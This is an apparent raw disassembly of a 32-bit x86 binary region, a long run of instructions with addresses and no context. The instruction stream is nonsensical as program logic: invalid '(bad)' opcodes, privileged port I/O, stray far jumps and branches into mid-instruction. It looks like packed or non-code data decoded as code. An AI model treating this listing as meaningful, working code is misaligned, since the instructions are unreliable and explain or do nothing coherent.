  41ca3c:	adc    eax,0xc04e04ec
  41ca41:	pop    edx
  41ca42:	jns    0x41ca31
  41ca44:	sub    eax,0x9f50a53b
  41ca49:	ror    BYTE PTR [ebx-0x378931f5],0x1f
  41ca50:	in     al,0xb3
  41ca52:	cwde   
  41ca53:	loope  0x41ca53
  41ca55:	je     0x41ca99
  41ca57:	test   DWORD PTR [esi-0x6a7de79f],0x235af336
  41ca61:	xlat   BYTE PTR ds:[ebx]
  41ca62:	and    eax,0x744cdf13
  41ca67:	sbb    edx,0xdf99a9a0
  41ca6d:	aas    
  41ca6e:	inc    al
  41ca70:	pop    ebx
  41ca71:	mov    edi,0xe614dd05
  41ca76:	imul   ecx,DWORD PTR [edx],0xb99b586d
  41ca7c:	xor    cl,BYTE PTR [ecx]
  41ca7e:	jb     0x41ca06
  41ca80:	sbb    eax,0xe090b795
  41ca85:	mov    cl,0xd6
  41ca87:	ja     0x41caea
  41ca89:	fist   DWORD PTR [edx]
  41ca8b:	call   DWORD PTR [edx]
  41ca8d:	push   ecx
  41ca8e:	loop   0x41ca77
  41ca90:	ret    
  41ca91:	mov    gs,WORD PTR [esp+edi*2+0x66]
  41ca95:	(bad)  
  41ca96:	xchg   esp,eax
  41ca97:	xor    BYTE PTR ds:0xe644b1ac,ah
  41ca9d:	cmp    DWORD PTR [ecx],ebx
  41ca9f:	repz test DWORD PTR [ecx-0x47],edx
  41caa3:	sbb    DWORD PTR [eax+0x31],esi
  41caa6:	aam    0x8b
  41caa8:	sar    DWORD PTR [ebx+eax*4],1
  41caab:	shr    BYTE PTR [edx+0x59],0x52
  41caaf:	fnstsw WORD PTR [esi+ebx*2+0x55]
  41cab3:	js     0x41caa6
  41cab5:	mov    DWORD PTR [esi+0x5d],ebx
  41cab8:	test   BYTE PTR [ecx-0x65],al
  41cabb:	or     ebp,ebx
  41cabd:	push   ebx
  41cabe:	add    al,0x90
  41cac0:	mov    DWORD PTR [ebx],ebx
  41cac2:	ja     0x41caa3
  41cac4:	ret    0x9594
  41cac7:	es xchg ebp,eax
  41cac9:	outs   dx,DWORD PTR ds:[esi]
  41caca:	jmp    0x53d8:0x7fef90f9
  41cad1:	pop    esi
  41cad2:	inc    esi
  41cad3:	jp     0x41cb4b
  41cad5:	fs mov bh,0x2b
  41cad8:	popf   
  41cad9:	xchg   edx,eax
  41cada:	mov    eax,0x46dbfd53
  41cadf:	das    
  41cae0:	loopne 0x41ca79
  41cae2:	(bad)  
  41cae3:	adc    ebp,DWORD PTR [eax+eax*4-0x3b421630]
  41caea:	inc    edx
  41caeb:	add    edi,DWORD PTR ds:0x717fd902
  41caf1:	pop    eax
  41caf2:	adc    edx,edi
  41caf4:	clc    
  41caf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caf6:	enter  0x4719,0x16
  41cafa:	pop    esp
  41cafb:	mov    ebp,0x3601bc1a
  41cb00:	jl     0x41caad
  41cb02:	stos   BYTE PTR es:[edi],al
  41cb03:	mov    ds:0x72e7c586,eax
  41cb08:	jo     0x41cab9
  41cb0a:	xchg   esp,eax
  41cb0b:	cmp    ch,ch
  41cb0d:	cwde   
  41cb0e:	jmp    0xb3a5:0x8f7a079b
  41cb15:	jae    0x41cb79
  41cb17:	lea    edi,ds:0x40064758
  41cb1d:	(bad)  
  41cb1e:	fcom   QWORD PTR ds:0x1cbc8dcd
  41cb24:	sbb    eax,0xba4166b7
  41cb29:	dec    edi
  41cb2a:	ret    
  41cb2b:	mov    al,ds:0x80a9e918
  41cb30:	cmp    eax,0x68042f68
  41cb35:	xor    DWORD PTR [eax-0x3d],eax
  41cb38:	lods   al,BYTE PTR ds:[esi]
  41cb39:	cwde   
  41cb3a:	cmp    eax,0x1f
  41cb3d:	push   ebx
  41cb3e:	iret   
  41cb3f:	xchg   esi,eax
  41cb40:	scas   al,BYTE PTR es:[edi]
  41cb41:	xor    DWORD PTR [edx-0x5c0131e6],eax
  41cb47:	ror    BYTE PTR [edx-0x24],1
  41cb4a:	fs sub eax,0x8a6794e8
  41cb50:	rcr    DWORD PTR [ecx],0xb2
  41cb53:	popa   
  41cb54:	push   0xa13405e7
  41cb59:	pop    eax
  41cb5a:	call   0x40cbf30a
  41cb5f:	in     al,0x30
  41cb61:	in     al,0xa0
  41cb63:	popf   
  41cb64:	sbb    eax,0xe55747b8
  41cb69:	push   esp
  41cb6a:	rcr    DWORD PTR [esi],1
  41cb6c:	xchg   esi,eax
  41cb6d:	les    esp,FWORD PTR [ebp+0x12]
  41cb70:	fiadd  DWORD PTR [edi+0x46522a34]
  41cb76:	fdiv   st(1),st
  41cb78:	pop    ss
  41cb79:	xor    dh,BYTE PTR [esp+ebp*1-0x40971d76]
  41cb80:	js     0x41cb87
  41cb82:	mov    ds:0x5693b368,eax
  41cb87:	sub    al,0xf3
  41cb89:	adc    eax,0x36309f66
  41cb8e:	rol    DWORD PTR [ebx-0x3479577f],1
  41cb94:	retf   
  41cb95:	loope  0x41cb6f
  41cb97:	leave  
  41cb98:	dec    si
  41cb9a:	inc    ecx
  41cb9b:	inc    edi
  41cb9c:	add    cl,dl
  41cb9e:	in     eax,dx
  41cb9f:	clc    
  41cba0:	ficomp DWORD PTR [ebx-0x75]
  41cba3:	dec    DWORD PTR es:[ebp+0x2186e5bf]
  41cbaa:	mov    esp,DWORD PTR ds:0x890aa6ea
  41cbb0:	add    ebx,DWORD PTR [ecx+0x7d]
  41cbb3:	mul    ah
  41cbb5:	mov    ds:0xe27ac74,al
  41cbba:	(bad)  
  41cbbb:	in     eax,0x10
  41cbbd:	ret    0xa7a3
  41cbc0:	mov    ds:0x8939484a,al
  41cbc5:	xchg   esp,eax
  41cbc6:	pop    ds
  41cbc7:	cmp    esp,DWORD PTR [ecx]
  41cbc9:	cmp    al,0x1b
  41cbcb:	inc    edi
  41cbcc:	test   BYTE PTR [eax+ecx*1],dl
  41cbcf:	mov    bl,0xc4
  41cbd1:	xchg   ebx,eax
  41cbd2:	pop    edi
  41cbd3:	mov    ds:0xb15566a3,al
  41cbd8:	dec    ebx
  41cbd9:	loope  0x41cc2c
  41cbdb:	scas   al,BYTE PTR es:[edi]
  41cbdc:	push   ecx
  41cbdd:	push   ecx
  41cbde:	fisubr DWORD PTR [ebx-0x51]
  41cbe1:	jae    0x41cbc9
  41cbe3:	add    edi,ecx
  41cbe5:	push   es
  41cbe6:	mov    dl,0x3
  41cbe8:	jmp    0x41cbb8
  41cbea:	mov    es,WORD PTR [esi+ebp*2]
  41cbed:	cmp    al,0xcc
  41cbef:	into   
  41cbf0:	adc    al,0xf7
  41cbf2:	inc    ebp
  41cbf3:	pop    esp
  41cbf4:	(bad)  
  41cbf5:	mov    cs,WORD PTR [edi]
  41cbf7:	out    0x64,eax
  41cbf9:	retf   
  41cbfa:	push   ds
  41cbfb:	stos   BYTE PTR es:[edi],al
  41cbfc:	in     eax,0x5e
  41cbfe:	ja     0x41cc02
  41cc00:	add    ecx,ecx
  41cc02:	dec    edx
  41cc03:	or     bl,dl
  41cc05:	cmp    esi,DWORD PTR [edi+0xf]
  41cc08:	sbb    al,0x23
  41cc0a:	pop    ds
  41cc0b:	adc    eax,0x3415412a
  41cc10:	stos   BYTE PTR es:[edi],al
  41cc11:	mov    bh,0x10
  41cc13:	jmp    0x50f004c
  41cc18:	jle    0x41cc38
  41cc1a:	sbb    cl,bh
  41cc1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc1d:	(bad)  
  41cc1e:	shr    DWORD PTR [eax],1
  41cc20:	jp     0x41cc0e
  41cc22:	in     al,dx
  41cc23:	ins    BYTE PTR es:[edi],dx
  41cc24:	jns    0x41cc8e
  41cc26:	stc    
  41cc27:	adc    bl,BYTE PTR [eax-0x75]
  41cc2a:	sbb    DWORD PTR [edi],esi
  41cc2c:	jl     0x41cc60
  41cc2e:	add    DWORD PTR [ebx-0x75],esi
  41cc31:	out    dx,al
  41cc32:	jns    0x41cc95
  41cc34:	jbe    0x41cbd0
  41cc36:	sbb    ch,bh
  41cc38:	jo     0x41cc91
  41cc3a:	mov    fs,WORD PTR [ebx]
  41cc3c:	cmp    BYTE PTR ds:0x9647a89c,0xaf
  41cc43:	jge    0x41cc8d
  41cc45:	xlat   BYTE PTR ds:[ebx]
  41cc46:	pop    esp
  41cc47:	aas    
  41cc48:	push   0x84b5cbe7
  41cc4d:	enter  0x2648,0xc2
  41cc51:	and    BYTE PTR [ecx],ah
  41cc53:	pop    ecx
  41cc54:	aad    0xe6
  41cc56:	(bad)  
  41cc57:	fnsave [eax]
  41cc59:	sbb    al,0xc
  41cc5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc5c:	aaa    
  41cc5d:	mov    esi,0xec3f0609
  41cc62:	sbb    esi,DWORD PTR [eax+0x1e19a9ad]
  41cc68:	mov    ebx,0x4b4787a9
  41cc6d:	push   es
  41cc6e:	aam    0x7f
  41cc70:	stos   BYTE PTR es:[edi],al
  41cc71:	and    esp,DWORD PTR ds:0xa706d731
  41cc77:	add    eax,0x5c550b05
  41cc7c:	dec    edi
  41cc7d:	stos   BYTE PTR es:[edi],al
  41cc7e:	push   edi
  41cc7f:	dec    edi
  41cc80:	xor    esi,DWORD PTR [ecx+0x7ffc7285]
  41cc86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc87:	xlat   BYTE PTR ds:[ebx]
  41cc88:	adc    DWORD PTR [ebx-0x3f],ebp
  41cc8b:	sbb    ebp,DWORD PTR [edx]
  41cc8d:	sbb    al,0x94
  41cc90:	pop    ds
  41cc91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc92:	ds retf 
  41cc94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc95:	dec    esp
  41cc96:	cmp    al,0xe9
  41cc98:	sahf   
  41cc99:	aad    0xea
  41cc9b:	packsswb mm5,QWORD PTR [ebx+0x32]
  41cc9f:	(bad)  
  41cca0:	push   0xffffffa5
  41cca2:	mov    dl,0xcc
  41cca4:	repnz stos BYTE PTR es:[edi],al
  41cca6:	dec    ecx
  41cca7:	enter  0x9dc8,0x69
  41ccab:	(bad)  
  41ccac:	hlt    
  41ccad:	pop    esp
  41ccae:	or     ecx,ebx
  41ccb0:	jecxz  0x41cc85
  41ccb2:	ins    DWORD PTR es:[edi],dx
  41ccb3:	out    dx,eax
  41ccb4:	ins    BYTE PTR es:[edi],dx
  41ccb5:	clc    
  41ccb6:	inc    esp
  41ccb7:	(bad)  
  41ccb8:	dec    ebp
  41ccb9:	jo     0x41cc70
  41ccbb:	dec    DWORD PTR [ebx]
  41ccbd:	jg     0x41ccaa
  41ccbf:	mov    ds:0xac27a24e,al
  41ccc4:	call   0x1fe10293
  41ccc9:	add    ch,BYTE PTR [ebx+0xbf66585]
  41cccf:	inc    esi
  41ccd0:	jmp    0xe6ec1c09
  41ccd5:	or     BYTE PTR [ecx-0x62a9d85c],bl
  41ccdb:	test   BYTE PTR [esi+0x3846e761],ch
  41cce1:	and    al,bh
  41cce3:	xchg   BYTE PTR [ebx-0x11],bh
  41cce6:	cwde   
  41cce7:	jmp    0x41cca8
  41cce9:	cld    
  41ccea:	and    edx,esp
  41ccec:	fwait
  41cced:	fwait
  41ccee:	inc    ecx
  41ccef:	adc    ah,0x19
  41ccf2:	stos   DWORD PTR es:[edi],eax
  41ccf3:	les    esi,FWORD PTR [ebx-0x4ee2a413]
  41ccf9:	sbb    al,0xc7
  41ccfb:	mov    edx,DWORD PTR [ecx]
  41ccfd:	xchg   ebx,eax
  41ccfe:	mov    dl,0x1a
  41cd00:	test   eax,0xc5386d11
  41cd05:	sub    BYTE PTR [edx-0x115fdb3d],ch
  41cd0b:	lods   eax,DWORD PTR ds:[esi]
  41cd0c:	popf   
  41cd0d:	fnsave [edx-0x540ada6a]
  41cd13:	mov    ch,0x65
  41cd15:	xchg   edi,eax
  41cd16:	sbb    BYTE PTR [ecx+ebp*4-0x4f],al
  41cd1a:	mov    ah,0xb
  41cd1c:	push   0xd1442767
  41cd21:	mov    edi,0x2b28fe57
  41cd26:	mov    edx,0x406d295b
  41cd2b:	outs   dx,BYTE PTR ds:[esi]
  41cd2c:	and    BYTE PTR [edi-0x4a],ch
  41cd2f:	scas   al,BYTE PTR es:[edi]
  41cd30:	hlt    
  41cd31:	rol    esi,1
  41cd33:	push   eax
  41cd34:	jno    0x41cd3c
  41cd36:	ror    esi,1
  41cd38:	jne    0x41ccde
  41cd3a:	jle    0x41ccf2
  41cd3c:	xchg   DWORD PTR [esp+ecx*4+0x37],edx
  41cd40:	xchg   ebp,eax
  41cd41:	pushf  
  41cd42:	pop    edi
  41cd43:	loop   0x41cd07
  41cd45:	mov    al,0x6c
  41cd47:	push   ebp
  41cd48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd49:	jmp    0x2a1d:0xd66a7a71
  41cd50:	sbb    bh,BYTE PTR [ecx+0x7e17ab4d]
  41cd56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd57:	jecxz  0x41cd21
  41cd59:	cdq    
  41cd5a:	mov    bh,0x61
  41cd5c:	sub    al,ch
  41cd5e:	cdq    
  41cd5f:	mov    gs,WORD PTR [edi]
  41cd61:	ja     0x41cd2c
  41cd63:	addr16 xchg edx,eax
  41cd65:	lods   eax,DWORD PTR ds:[esi]
  41cd66:	lock push ecx
  41cd68:	scas   al,BYTE PTR es:[edi]
  41cd69:	mov    cl,0x55
  41cd6b:	dec    esi
  41cd6c:	sub    eax,0xb205ebab
  41cd71:	repz arpl WORD PTR [edi],di
  41cd74:	hlt    
  41cd75:	int3   
  41cd76:	mov    bh,0x6e
  41cd78:	cmp    ecx,DWORD PTR ss:[edx+0x79]
  41cd7c:	cli    
  41cd7d:	push   eax
  41cd7e:	inc    esp
  41cd7f:	jl     0x41cd92
  41cd81:	pop    es
  41cd82:	pop    ss
  41cd83:	push   edi
  41cd84:	(bad)  
  41cd85:	cdq    
  41cd86:	mov    ebx,0xe8ef1509
  41cd8b:	pop    eax
  41cd8c:	pop    eax
  41cd8d:	push   eax
  41cd8e:	push   ds
  41cd8f:	cwde   
  41cd90:	push   es
  41cd91:	xor    edi,DWORD PTR [ebp-0x343d74f0]
  41cd97:	and    eax,0x553f4f27
  41cd9c:	and    BYTE PTR [edi+0x40a06e5],cl
  41cda2:	or     ecx,DWORD PTR [esi-0x63]
  41cda5:	xor    DWORD PTR [ebx+0x28c52ac0],ebp
  41cdab:	jecxz  0x41cd86
  41cdad:	popa   
  41cdae:	loope  0x41cdbc
  41cdb0:	sub    BYTE PTR [ebp-0x21315f2d],bh
  41cdb6:	fs sub al,0x41
  41cdb9:	cdq    
  41cdba:	in     al,dx
  41cdbb:	scas   eax,DWORD PTR es:[edi]
  41cdbc:	std    
  41cdbd:	sub    dl,BYTE PTR [ebp+esi*2+0x71]
  41cdc1:	fwait
  41cdc2:	xchg   edx,eax
  41cdc3:	neg    BYTE PTR [ebx-0x23c23c46]
  41cdc9:	sar    BYTE PTR [ecx-0x7],0x54
  41cdcd:	ret    0x83f1
  41cdd0:	cmp    DWORD PTR [edx],ebx
  41cdd2:	xchg   ecx,eax
  41cdd3:	mov    ch,0x3
  41cdd5:	add    al,0x12
  41cdd7:	in     eax,0x8c
  41cdd9:	xor    al,0xcd
  41cddb:	push   eax
  41cddc:	xchg   esp,eax
  41cddd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdde:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cde0:	cwde   
  41cde1:	mov    al,ds:0x74a8f29a
  41cde6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cde7:	xor    bh,dh
  41cde9:	shl    DWORD PTR [ebx],0xc2
  41cdec:	je     0x41cd8a
  41cdee:	icebp  
  41cdef:	sti    
  41cdf0:	test   eax,0x52f544ca
  41cdf5:	test   BYTE PTR [ebp-0x22d825c2],0xf2
  41cdfc:	mov    ds:0x93ecb2ba,eax
  41ce01:	xor    dh,BYTE PTR [ebp-0x5345a102]
  41ce07:	push   esp
  41ce08:	fidivr WORD PTR [edx-0x523b23a]
  41ce0e:	pop    ds
  41ce0f:	jmp    0x2886927f
  41ce14:	or     ebp,DWORD PTR [edx+0x5591c717]
  41ce1a:	push   ecx
  41ce1b:	push   ss
  41ce1c:	fild   DWORD PTR [ecx+0x4bf99245]
  41ce22:	adc    DWORD PTR [edx],0x68
  41ce25:	aaa    
  41ce26:	(bad)  
  41ce27:	ss xchg ebx,eax
  41ce29:	dec    edx
  41ce2a:	sar    BYTE PTR [ebp-0x2349b298],cl
  41ce30:	dec    edx
  41ce31:	and    eax,0xe511456c
  41ce36:	mov    BYTE PTR [ebp+0x44],ch
  41ce39:	imul   esp,DWORD PTR [edx],0x18
  41ce3c:	retf   0xbd56
  41ce3f:	clc    
  41ce40:	add    al,0xed
  41ce42:	sbb    dl,BYTE PTR [esi]
  41ce44:	jo     0x41ce9d
  41ce46:	stos   DWORD PTR es:[edi],eax
  41ce47:	hlt    
  41ce48:	jmp    0x41cde8
  41ce4a:	outs   dx,DWORD PTR ds:[esi]
  41ce4b:	push   es
  41ce4c:	ja     0x41ce45
  41ce4e:	xchg   edi,edi
  41ce50:	ret    
  41ce51:	aaa    
  41ce52:	nop
  41ce53:	sbb    ebp,DWORD PTR [ebp+esi*4-0x4]
  41ce57:	rcr    DWORD PTR [esi],cl
  41ce59:	mov    BYTE PTR [eax-0x3c],0x7c
  41ce5d:	dec    edx
  41ce5e:	(bad)  
  41ce60:	fs sub al,0x3a
  41ce63:	and    ebx,edi
  41ce65:	(bad)  
  41ce66:	mov    esi,0xbba4a5f0
  41ce6b:	cld    
  41ce6c:	jg     0x41ced8
  41ce6e:	test   BYTE PTR [ebx+0x3a],ch
  41ce71:	and    BYTE PTR [ebp-0x2c38a184],cl
  41ce77:	enter  0x4197,0x67
  41ce7b:	mov    ebx,0x98c2c5f3
  41ce80:	and    eax,0xf9c002a
  41ce85:	aas    
  41ce86:	icebp  
  41ce87:	xlat   BYTE PTR ds:[ebx]
  41ce88:	jnp    0x41ce8d
  41ce8a:	sbb    al,BYTE PTR [ebx-0x1b]
  41ce8d:	repz cld 
  41ce8f:	cs xbegin 0xc10a1ef8
  41ce96:	push   esi
  41ce97:	out    0xb4,eax
  41ce99:	or     DWORD PTR [ebx+0x4e736e1],0xffffffa7
  41cea0:	mov    ?,ebp
  41cea2:	cmp    al,0x42
  41cea4:	adc    al,0xa2
  41cea6:	out    0x8e,eax
  41cea8:	shl    BYTE PTR [eax-0x6773d7c3],cl
  41ceae:	and    ebp,eax
  41ceb0:	in     al,dx
  41ceb1:	fadd   st(0),st
  41ceb3:	push   ebp
  41ceb4:	out    dx,al
  41ceb5:	bound  edi,QWORD PTR [edi]
  41ceb7:	push   0x5d4c73c0
  41cebc:	int3   
  41cebd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cebe:	push   ecx
  41cebf:	jbe    0x41cf02
  41cec1:	(bad)  
  41cec2:	push   0x6ef3e20d
  41cec7:	xchg   edx,eax
  41cec8:	loop   0x41cf19
  41ceca:	mov    ch,0x86
  41cecc:	push   edi
  41cecd:	(bad)  
  41cece:	ins    BYTE PTR es:[edi],dx
  41cecf:	lds    ebx,FWORD PTR [eax]
  41ced1:	xchg   edi,eax
  41ced2:	test   DWORD PTR [eax+0x75583cfa],0xe40f299e
  41cedc:	mov    cl,0xa0
  41cede:	cmp    eax,0xe38cd800
  41cee3:	retf   0x638a
  41cee6:	and    al,0xd0
  41cee8:	fistp  DWORD PTR [eax]
  41ceea:	mov    esi,0x146a14a8
  41ceef:	pop    esi
  41cef0:	xchg   ebx,eax
  41cef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cef2:	pop    ss
  41cef3:	outs   dx,BYTE PTR ds:[esi]
  41cef4:	scas   eax,DWORD PTR es:[edi]
  41cef5:	dec    edx
  41cef6:	scas   al,BYTE PTR es:[edi]
  41cef7:	and    DWORD PTR [ecx+ebx*2-0x6b],eax
  41cefb:	lds    esi,FWORD PTR [ebx-0x386b89df]
  41cf01:	loope  0x41cf14
  41cf03:	in     al,0x52
  41cf05:	xchg   edx,eax
  41cf06:	adc    ebx,DWORD PTR [ecx]
  41cf08:	pop    ss
  41cf09:	adc    DWORD PTR ds:0x385d0eec,0xfffffff8
  41cf10:	imul   ebp,DWORD PTR [edx-0x3b554201],0x1
  41cf17:	shr    DWORD PTR [esi+esi*2+0x6a],1
  41cf1b:	pop    ecx
  41cf1c:	jb     0x41cf4a
  41cf1e:	icebp  
  41cf1f:	mov    BYTE PTR [esi],al
  41cf21:	test   eax,0x50756fcd
  41cf26:	popa   
  41cf27:	sbb    edx,esp
  41cf29:	jb     0x41cf99
  41cf2b:	xchg   edi,eax
  41cf2c:	aam    0xb8
  41cf2e:	sbb    eax,0xf6da2ae2
  41cf33:	mov    ebp,0x61246a2c
  41cf38:	gs inc eax
  41cf3a:	mov    ecx,0x278acf9c
  41cf3f:	dec    ebx
  41cf40:	es into 
  41cf42:	adc    BYTE PTR [ecx],0xb3
  41cf45:	inc    ecx
  41cf46:	in     al,0x6
  41cf48:	jno    0x41cfb6
  41cf4a:	xchg   esi,eax
  41cf4b:	adc    ebx,DWORD PTR [edx+0x26]
  41cf4e:	test   DWORD PTR [edx],esp
  41cf50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf51:	adc    BYTE PTR [ecx-0x3bf318f4],ah
  41cf57:	mov    al,ds:0x504b5ee8
  41cf5c:	jne    0x41cf21
  41cf5e:	retf   
  41cf5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf60:	mov    ds:0xd1a8275d,eax
  41cf65:	push   0x2
  41cf67:	out    0xeb,eax
  41cf69:	lods   eax,DWORD PTR ds:[esi]
  41cf6a:	xchg   esi,eax
  41cf6b:	ret    
  41cf6c:	xor    DWORD PTR [edx],edx
  41cf6e:	ret    0xb65a
  41cf71:	sar    BYTE PTR [edx+0x313c01c6],1
  41cf77:	jmp    0x7ffcfca7
  41cf7c:	ins    DWORD PTR es:[edi],dx
  41cf7d:	in     eax,dx
  41cf7e:	fdiv   st,st(1)
  41cf80:	outs   dx,DWORD PTR ds:[esi]
  41cf81:	lods   eax,DWORD PTR ds:[esi]
  41cf82:	adc    ch,bl
  41cf84:	mov    dl,0xfc
  41cf86:	outs   dx,DWORD PTR ds:[esi]
  41cf87:	jle    0x41cf67
  41cf89:	mov    eax,0xe0dda500
  41cf8e:	frndint 
  41cf90:	lods   eax,DWORD PTR ds:[esi]
  41cf91:	jne    0x41cf49
  41cf93:	imul   ebp,esi,0x47
  41cf96:	xor    edx,eax
  41cf98:	repz cmp edx,esp
  41cf9b:	hlt    
  41cf9c:	pop    es
  41cf9d:	int3   
  41cf9e:	sti    
  41cf9f:	push   eax
  41cfa0:	mov    eax,ds:0x6c145f2c
  41cfa5:	enter  0xb209,0x39
  41cfa9:	mov    ah,0xf0
  41cfab:	adc    DWORD PTR [eax-0x5a],ecx
  41cfae:	push   ss
  41cfaf:	pop    esp
  41cfb0:	mov    DWORD PTR [eax],esi
  41cfb2:	iret   
  41cfb3:	cmp    BYTE PTR [edx+0x7e6fe07a],bl
  41cfb9:	pusha  
  41cfba:	mov    ds:0x56f7f899,al
  41cfbf:	add    edi,eax
  41cfc1:	dec    esi
  41cfc2:	ins    DWORD PTR es:[edi],dx
  41cfc3:	lea    edx,[edx+ebx*1+0x18]
  41cfc7:	push   0xfffffffc
  41cfc9:	cmp    esi,DWORD PTR [esi+0x28baee8e]
  41cfcf:	xor    BYTE PTR [ecx+0x5faa9ba1],0xe
  41cfd6:	mov    DWORD PTR [eax-0x5c],0x54e2b81e
  41cfdd:	adc    al,0x3c
  41cfdf:	sbb    BYTE PTR [ebp-0x23357249],al
  41cfe5:	lods   al,BYTE PTR ds:[esi]
  41cfe6:	add    ebp,DWORD PTR [ecx+0x3e]
  41cfe9:	jecxz  0x41cfc1
  41cfeb:	leave  
  41cfec:	(bad)  
  41cfed:	lds    ebx,FWORD PTR [ecx+esi*4]
  41cff0:	jbe    0x41d051
  41cff2:	add    eax,0x7a249831
  41cff7:	push   ebp
  41cff8:	(bad)  
  41cff9:	aam    0xa9
  41cffb:	ja     0x41cfc1
  41cffd:	push   0x522d3f8a
  41d002:	push   ebx
  41d003:	int3   
  41d004:	shr    DWORD PTR [edx+0x108c5170],cl
  41d00a:	dec    ebp
  41d00b:	mov    DWORD PTR [esi],edi
  41d00d:	into   
  41d00e:	lock push esi
  41d010:	repz ja 0x41d062
  41d013:	mov    DWORD PTR [edx+0x74],eax
  41d016:	add    bh,al
  41d018:	ror    DWORD PTR ds:0xe25d2310,1
  41d01e:	or     ch,BYTE PTR [edx-0x6a]
  41d021:	xor    al,0xf7
  41d023:	push   cs
  41d024:	push   0x9efb0571
  41d029:	push   edx
  41d02a:	jle    0x41d09c
  41d02c:	jns    0x41d032
  41d02e:	scas   al,BYTE PTR es:[edi]
  41d02f:	ret    
  41d030:	mov    ebp,ecx
  41d032:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d034:	and    BYTE PTR ds:0x952a2cd1,0xab
  41d03b:	test   al,0xab
  41d03d:	fcomp  QWORD PTR [edi]
  41d03f:	pop    eax
  41d040:	add    DWORD PTR [eax-0x7eab3a78],ebp
  41d046:	sbb    BYTE PTR [esi+0x13d7b0d3],al
  41d04c:	jmp    0x41d06c
  41d04e:	ja     0x41d0c3
  41d050:	mov    ah,0x3d
  41d052:	cmp    DWORD PTR [edx+edx*2+0x0],edi
  41d056:	mov    eax,0x45d5d88d
  41d05b:	pop    esi
  41d05c:	jne    0x41d0c1
  41d05e:	jae    0x41d03d
  41d060:	add    al,0xc6
  41d062:	call   0xe6df383c
  41d067:	jbe    0x41d098
  41d069:	ja     0x41d078
  41d06b:	call   0x7eab9f9
  41d070:	add    BYTE PTR [esi-0x64],dh
  41d073:	adc    DWORD PTR [ecx+0x3a],esp
  41d076:	xor    edi,DWORD PTR [edx+ecx*8-0x3f]
  41d07a:	into   
  41d07b:	(bad)  
  41d07c:	or     edi,DWORD PTR [eax-0x4f]
  41d07f:	iret   
  41d080:	daa    
  41d081:	out    0xdd,al
  41d083:	das    
  41d084:	imul   edx,DWORD PTR [ebp+0x25678849],0x84284130
  41d08e:	add    esi,DWORD PTR [ebp-0xe9b1eca]
  41d094:	and    ebx,ecx
  41d096:	sbb    ch,BYTE PTR [edi+0x77]
  41d099:	aaa    
  41d09a:	sub    eax,0x8a02732
  41d09f:	aam    0xf
  41d0a1:	shl    BYTE PTR [ebp+0x1b],0xb2
  41d0a5:	(bad)
  41d0a8:	ja     0x41d0ed
  41d0aa:	adc    esp,esp
  41d0ac:	adc    al,0xf8
  41d0ae:	loopne 0x41d061
  41d0b0:	sbb    eax,DWORD PTR [ebp+ebx*1-0x3ccb6c7a]
  41d0b7:	test   eax,0xbff153f6
  41d0bc:	test   eax,0x71472dae
  41d0c1:	div    DWORD PTR [edi]
  41d0c3:	fcomp  DWORD PTR [esi+0x3a3c4847]
  41d0c9:	rcr    DWORD PTR [ebx+0x277f219f],0x78
  41d0d0:	int3   
  41d0d1:	mov    ah,bl
  41d0d3:	int3   
  41d0d4:	jno    0x41d146
  41d0d6:	retf   
  41d0d7:	bound  esi,QWORD PTR [eax]
  41d0d9:	adc    eax,0x51f70469
  41d0de:	inc    ecx
  41d0df:	inc    edx
  41d0e0:	mov    esp,0x1a27f4b4
  41d0e5:	lock inc edi
  41d0e7:	pusha  
  41d0e8:	inc    esi
  41d0e9:	sub    DWORD PTR [edx],edx
  41d0eb:	vmwrite esp,DWORD PTR [eax+0x5d]
  41d0ef:	sub    ebx,esi
  41d0f1:	cmc    
  41d0f2:	push   esi
  41d0f3:	inc    ecx
  41d0f4:	addr16 inc esi
  41d0f6:	pop    edx
  41d0f7:	inc    BYTE PTR [esi]
  41d0f9:	mov    cl,0xc3
  41d0fb:	lahf   
  41d0fc:	aam    0xcd
  41d0fe:	int3   
  41d0ff:	sbb    dl,BYTE PTR [edx-0x4ed8d59f]
  41d105:	cmp    DWORD PTR [esi-0x40],eax
  41d108:	mov    edi,0x7a228bc1
  41d10d:	lahf   
  41d10e:	mov    ?,esi
  41d110:	mov    al,ds:0xef039245
  41d115:	dec    ecx
  41d116:	pop    ebp
  41d117:	arpl   sp,bx
  41d119:	mov    ds:0x6cf2fce1,al
  41d11e:	int    0x83
  41d120:	fisubr WORD PTR [ebx-0x1e]
  41d123:	aaa    
  41d124:	lock push cs
  41d126:	xor    al,BYTE PTR [edi+0x24]
  41d129:	int    0x4b
  41d12b:	jle    0x41d0c2
  41d12d:	cmp    bh,dl
  41d12f:	fnstcw WORD PTR [edi]
  41d131:	xor    bl,al
  41d133:	ja     0x41d0f0
  41d135:	outs   dx,BYTE PTR ds:[esi]
  41d136:	loope  0x41d0f7
  41d138:	int3   
  41d139:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41d13b:	cmc    
  41d13c:	std    
  41d13d:	mov    bl,0x35
  41d13f:	in     eax,dx
  41d140:	ffreep st(4)
  41d142:	mov    cl,BYTE PTR ds:0x2a0761bf
  41d148:	adc    DWORD PTR [edi+0x13],esi
  41d14b:	jmp    0x1b6a:0xc25f7800
  41d152:	jp     0x41d0f7
  41d154:	ds jo  0x41d129
  41d157:	add    al,0x2a
  41d159:	daa    
  41d15a:	jle    0x41d124
  41d15c:	(bad)  
  41d15e:	mov    es,ebp
  41d160:	dec    esi
  41d161:	jb     0x41d136
